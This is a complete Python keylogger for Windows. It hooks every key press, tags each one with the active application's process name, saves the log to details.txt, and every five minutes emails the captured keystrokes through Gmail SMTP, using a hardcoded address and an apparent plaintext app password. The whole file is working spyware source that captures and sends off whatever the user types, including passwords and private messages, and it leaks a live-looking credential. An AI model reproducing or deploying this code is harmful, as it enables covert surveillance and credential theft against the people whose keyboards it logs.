import keyboard
import time
from datetime import datetime
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket
import sys
import psutil
import win32gui
import win32process

# Email configuration
EMAIL_ADDRESS = "jethrojerrybj@gmail.com"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465
MAX_RETRIES = 3

# Store keystrokes and app info in memory
keystrokes_buffer = []
last_email_time = time.time()
last_save_time = time.time()
last_app = None

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return process.name()
    except:
        return "Unknown"

def format_log_entry(timestamp, key_pressed, active_app):
    return f"[{timestamp}] App: {active_app} | Key: {key_pressed}\n"

def save_to_file(log_content):
    try:
        with open('details.txt', 'a') as f:
            f.write(log_content)
        print("Log saved to file successfully")
    except Exception as e:
        print(f"Error saving to file: {e}")

def send_email(log_content):
    for attempt in range(MAX_RETRIES):
        try:
            socket.setdefaulttimeout(10)
            
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = EMAIL_ADDRESS
            msg['Subject'] = f"Keylogger Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            msg.attach(MIMEText(log_content, 'plain'))
            
            server = smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT, timeout=10)
            server.login(EMAIL_ADDRESS, 'mvxcbubbpwivydyq')
            server.send_message(msg)
            server.quit()
            
            print("Log sent successfully via email")
            return True
        except (smtplib.SMTPException, socket.timeout, socket.error) as e:
            print(f"Email attempt {attempt + 1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                print("Retrying in 5 seconds...")
                time.sleep(5)
            else:
                print("All email attempts failed. Falling back to local file storage...")
                save_to_file(log_content)
                return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            save_to_file(log_content)
            return False

def on_key_press(event):
    global last_email_time, last_save_time, last_app
    
    # Get current timestamp and active application
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    current_app = get_active_window()
    
    # Only log app change if it's different from last app
    if current_app != last_app:
        app_change_info = f"[{timestamp}] Application changed to: {current_app}\n"
        keystrokes_buffer.append(app_change_info)
        last_app = current_app
    
    # Format the key press information with app context
    key_info = format_log_entry(timestamp, event.name, current_app)
    
    # Add to buffer
    keystrokes_buffer.append(key_info)
    
    # Check if it's time to send email or save to file
    current_time = time.time()
    
    # Try to send email every 5 minutes or when buffer is large
    if (current_time - last_email_time >= 300) or (len(keystrokes_buffer) >= 100):
        if keystrokes_buffer:
            if not send_email(''.join(keystrokes_buffer)):
                save_to_file(''.join(keystrokes_buffer))
            keystrokes_buffer.clear()
            last_email_time = current_time
    
    # Also save to file every minute as backup
    elif current_time - last_save_time >= 60:
        if keystrokes_buffer:
            save_to_file(''.join(keystrokes_buffer))
            keystrokes_buffer.clear()
        last_save_time = current_time

def main():
    print("Keylogger started. Press 'esc' to stop.")
    print("Logs will be sent via email and also saved locally to details.txt")
    print("Monitoring active applications and keystrokes...")
    
    # Create initial log file
    if not os.path.exists('details.txt'):
        with open('details.txt', 'w') as f:
            f.write(f"Keylogger started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    
    # Get initial active application
    global last_app
    last_app = get_active_window()
    
    # Register the callback
    keyboard.on_press(on_key_press)
    
    try:
        keyboard.wait('esc')
    except KeyboardInterrupt:
        print("\nProgram interrupted by user")
    finally:
        if keystrokes_buffer:
            if not send_email(''.join(keystrokes_buffer)):
                save_to_file(''.join(keystrokes_buffer))
        
        print("\nKeylogger stopped. Check your email and details.txt for the logs.")

if __name__ == "__main__":
    main()